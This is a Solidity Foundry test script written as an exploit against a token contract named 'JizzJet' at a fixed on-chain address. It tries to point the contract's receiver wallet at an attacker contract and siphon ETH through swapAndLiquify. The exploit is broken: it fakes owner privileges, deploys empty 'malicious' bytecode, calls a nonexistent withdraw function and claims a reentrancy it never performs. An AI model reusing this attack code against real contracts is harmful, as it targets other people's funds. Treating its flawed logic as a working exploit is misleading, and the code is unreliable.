pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface JizzJet {
    function owner() external view returns (address);
    function _setReceiverWallet(address payable adminWalletAddress) external;
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function swapAndLiquifyEnabled() external view returns (bool);
}

interface IERC20 {
    function transfer(address recipient, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0xF2A7429641d1b49a13dCB7E23b67a1a5101231F2;
    address attacker = address(this);
    address maliciousContract;
    bytes maliciousContractCode;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        JizzJet target = JizzJet(TARGET);

        // Malicious contract to capture ETH via reentrancy
        // Removed local shadowing declaration
        maliciousContractCode = abi.encodePacked(
            ""
        );
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        JizzJet target = JizzJet(TARGET);
        uint256 initialBalance = address(this).balance;
        // Deploy malicious contract that will receive ETH
        maliciousContract = vm.addr(0x1337);
        vm.etch(maliciousContract, maliciousContractCode);

        // Set the admin wallet to our malicious contract (need owner privileges)
        vm.startPrank(target.owner());
        target._setReceiverWallet(payable(maliciousContract));
        vm.stopPrank();

        // Inject native tokens for gas
        deal(address(this), 10 ether);

        // Inject JizzJet tokens to attacker
        uint256 tokenAmount = 200000000000 * 10**18; // More than threshold
        deal(TARGET, address(this), tokenAmount);

        // Record initial balance
        initialBalance = address(this).balance;

        // Transfer tokens to victim contract to accumulate above threshold
        IERC20(TARGET).transfer(TARGET, tokenAmount / 2);

        // Now trigger swapAndLiquify by transferring more tokens
        // This should cause the contract to swap tokens and send ETH to admin (our malicious contract)
        IERC20(TARGET).transfer(TARGET, tokenAmount / 4);

        // The malicious contract should have received ETH
        // Forward ETH from malicious contract to attacker
        (bool success, ) = maliciousContract.call(abi.encodeWithSignature("withdraw()"));
        if (!success) {
            // Try direct transfer if withdraw fails
            (success, ) = payable(address(this)).call{value: address(maliciousContract).balance}("");
        }

        // Check if attacker balance increased
        uint256 finalBalance = address(this).balance;
        assertGt(finalBalance, initialBalance, "Attacker balance should have increased");
        finalBalance = address(this).balance;
        assertGt(finalBalance, initialBalance, "Economic Exploit Failed: No profit");
    }

    receive() external payable {}
    fallback() external payable {}
}

